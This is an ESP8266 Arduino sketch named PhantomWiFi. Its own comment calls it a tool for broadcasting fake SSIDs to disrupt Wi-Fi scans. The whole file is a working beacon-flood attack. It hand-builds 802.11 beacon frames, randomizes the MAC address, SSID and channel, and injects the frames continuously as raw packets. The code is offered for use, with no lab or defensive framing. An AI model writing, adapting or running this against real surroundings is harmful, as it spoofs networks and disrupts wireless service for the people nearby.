/*
 * PhantomWiFi
 * A tool that broadcasts fake SSIDs to disrupt Wi-Fi scans and signals.
 * Author - WireBits
 */

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

String ssid = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
bool beaconing = true;
uint8_t packet[128] = {
                       0x80, 0x00, 0x00, 0x00,
                       0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0xc0, 0x6c,
                       0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                       0x64, 0x00,
                       0x01, 0x04,
                       0x00, 0x08,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
                       0x03, 0x01, 0x04
};

void setup() {
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
}

void loop() {
  if (beaconing) {
    for (int i = 0; i < 121; i++) {
      wifi_set_channel(random(1, 12));
      for (int j = 10; j <= 21; j++) packet[j] = random(256);
      for (int j = 38; j < 46; j++) packet[j] = ssid[random(ssid.length())];
      packet[56] = random(1, 12);
      wifi_send_pkt_freedom(packet, 57, 0);
      delay(1);
    }
  }
}
